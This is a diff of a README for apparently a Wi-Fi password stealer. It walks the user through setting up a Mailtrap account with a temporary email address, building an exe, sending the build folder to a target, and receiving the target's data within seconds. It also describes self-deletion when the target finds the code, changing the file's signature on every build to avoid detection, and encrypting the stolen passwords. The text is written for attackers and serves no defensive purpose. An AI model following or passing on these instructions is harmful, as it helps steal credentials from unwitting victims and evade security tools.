@@ -17,7 +17,7 @@ pip install glob
 
 ## USAGE
 
-•**Create Temp Mail send Create an account on "https://mailtrap.io/" using a temp mail.**
+•**Create Temp Mail and Create an account on "https://mailtrap.io/" using a temp mail.**
 
 ![github-small](/images/dene.png)
 
@@ -32,18 +32,18 @@ pip install glob
 python setup.py build
 
 ```
-**Send the all files to your target in "build" Folder.**
+**Send the "build" Folder to your target.**
 
 
 •**Run exe on Target Computer**
 
-•**In 10 seconds,You Get the Data from the Target Computer**
+•**In 5-10 seconds,You Get the Data from the Target Computer**
 
 •**If Target finds the Code and Open the File The Program DELETE itself.**
 
 ## CHANGING THE SIGNATURE AND ENCRYPTION
 
-Every time you run it, Signature will change with the codes in "setup.py" file.It's add unused variable every time when you create exe.If you want encrypt the Informations.txt with using the "Encrypt-Decrypt.py".
+Every time you run it, Signature will change when you run "setup.py.If you want encrypt the Informations.txt (Wifi Password) using the "Encrypt-Decrypt.py".
 
 
 ## Another Projects : 
